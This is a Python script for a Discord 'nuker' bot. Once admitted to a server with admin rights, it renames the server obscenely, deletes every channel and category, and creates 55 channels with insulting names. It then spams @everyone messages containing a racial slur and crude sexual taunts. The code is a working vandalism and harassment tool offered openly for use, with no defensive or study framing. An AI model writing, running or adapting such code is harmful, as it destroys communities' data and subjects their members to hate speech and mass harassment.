from colorama import Style, Fore, init; init()
import discord; import random

TOKEN = ""

strings = ["UWU", "Cock", "Brudi is best", "You're dum", "dick", "69696969", "LOL", "Get REKT", "Oh noo 😭", "No more server", "Trash server", "uwu", "OwO", "This server is bad", "Hell nah ☠💀", "You guys have no parents", "Brudi is your daddy", "Brudi on top", "heheheha", "LOL", "say daddy", "lollll", "💀", "Im not sorry", "wanna be my mommy?", "Yo got no bitches", "USE MY NUKER", "LMAO", "🐒🐒🐒🐒"]

everyone = "@everyone"
messages = [f"{everyone} UWU", f"{everyone} LOL", f"{everyone} 6969696969", f"{everyone} Dicks", f"{everyone} Oh noo", f"{everyone} No more server", f"{everyone} uwu", f"{everyone} OwO", f"{everyone} Trollo 🐰", f"{everyone} Brudi your daddy", f"{everyone} Brudi on top", f"{everyone} Say daddy!!!", f"{everyone} Wanna be my mommy", f"{everyone} Yo got no bitches", f"{everyone} 🐒🐒🐒🐒", f"{everyone} USE MY NUKER", f"{everyone} You can be my mommy", f"{everyone} LMFAO", f"{everyone} NIGGER", f"{everyone} GET REKT", f"{everyone} lolll", f"https://tenor.com/view/nuke-gif-8044239", f"https://tenor.com/view/discord-discord-channel-discord-channel-nuke-channel-nuke-gif-20706567", f"https://tenor.com/view/no-one-cares-i-dont-care-idc-nobody-cares-gif-8737514", f"https://tenor.com/view/rekt-nuke-gif-4611249"]

def Get_Info():
    global TOKEN
    TOKEN = input(f"{Fore.LIGHTCYAN_EX}[{Style.RESET_ALL}?{Fore.LIGHTCYAN_EX}]{Style.RESET_ALL} Enter Bot-Token (Must be invited to the server!): ")
    start = input(f"{Fore.LIGHTCYAN_EX}[{Style.RESET_ALL}?{Fore.LIGHTCYAN_EX}]{Style.RESET_ALL} Shall we start? (Y/n): ")
    if start == "Y":
        print(f"{Fore.LIGHTCYAN_EX}[{Style.RESET_ALL}!{Fore.LIGHTCYAN_EX}]{Style.RESET_ALL} Warning. Make sure the bot has admin, and permissions. Write in any channel '>nuke' to start.")
        run()
    else:
        print(f"{Fore.RED}[{Style.RESET_ALL}!{Fore.RED}]{Style.RESET_ALL} Nuke got cancelled.")

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"{Fore.LIGHTCYAN_EX}[{Style.RESET_ALL}!{Fore.LIGHTCYAN_EX}]{Style.RESET_ALL} Logged in Bot: '{client.user.name}' ({client.user.id})")

@client.event
async def on_message(message):
    try:
        await message.guild.edit(name="SERVER GOT FUCKED")
        if message.author == client.user:
            return

        if message.content.startswith('>nuke'):
            server = message.guild

            for member in message.guild.members:
                try:
                    await member.send("Hello")
                except discord.HTTPException:
                    pass

            for channel in server.text_channels:
                await channel.delete()

            for channel in server.voice_channels:
                await channel.delete()

            for category in server.categories:
                await category.delete()

            new_channels = []
            for _ in range(55):
                channel_name = random.choice(strings)
                new_channel = await server.create_text_channel(channel_name)
                new_channels.append(new_channel)
            
            for channel in new_channels:
                random_message = random.choice(messages)
                await channel.send(random_message)

            for channel in new_channels:
                random_message = random.choice(messages)
                await channel.send(random_message)

    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}")

def run():
    client.run(TOKEN)